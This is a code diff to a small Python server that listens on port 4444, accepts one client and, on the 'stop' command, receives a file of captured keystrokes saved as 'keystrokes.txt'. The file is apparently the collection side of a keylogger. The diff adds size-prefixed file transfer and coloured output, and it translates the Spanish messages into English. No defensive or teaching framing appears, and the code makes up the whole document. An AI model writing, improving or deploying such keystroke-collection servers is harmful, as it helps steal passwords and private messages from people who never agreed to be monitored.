@@ -1,3 +1,5 @@
+from colorama import Fore
+
 import socket
 
 def banner() -> None:
@@ -17,28 +19,39 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(("0.0.0.0", 4444))
 server.listen(1)
 
-print("Listening...")
+print(f"{Fore.WHITE}Listening...")
 client, address = server.accept()
-print(f"[+] Conexión establecida desde {address}")
+print(f"{Fore.WHITE}[+] Client {address[0]} has joined the server!")
 
 while True:
-    command = input("\n[*] Stop to halt execution: ").strip().lower()
-    print("\n")
+    try:
+        command = input(f"{Fore.WHITE}\n[*] Stop to halt execution: ").strip().lower()
+        print("\n")
 
-    if command == "stop":
-        client.sendall(command.encode())
+        if command == "stop":
+            client.sendall(command.encode())
 
-        with open("pulsaciones_registradas.txt", "wb") as file:
-            while True:
-                chunk = client.recv(1024)
-                if not chunk:
-                    break
-                file.write(chunk)
+            size_data = client.recv(8)
+            if not size_data:
+                break
+            file_size = int.from_bytes(size_data, "big")
 
-        print("[+] File received.")
+            recibido = 0
+            with open("keystrokes.txt", "wb") as file:
+                while recibido < file_size:
+                    chunk = client.recv(min(1024, file_size - recibido))
+                    if not chunk:
+                        break
+                    file.write(chunk)
+                    recibido += len(chunk)
+
+            print(f"{Fore.WHITE}[+] File received.")
+        else:
+            print(f"{Fore.WHITE}[-] Unknow command. Please enter 'stop' to recive the file.")
+
+    except KeyboardInterrupt:
+        print(f"\n{Fore.WHITE}[!] Server killed.")
         break
-    else:
-        print("[-] Comando no reconocido. Escribe 'stop' para detener la ejecución.")
 
 client.close()
 server.close()
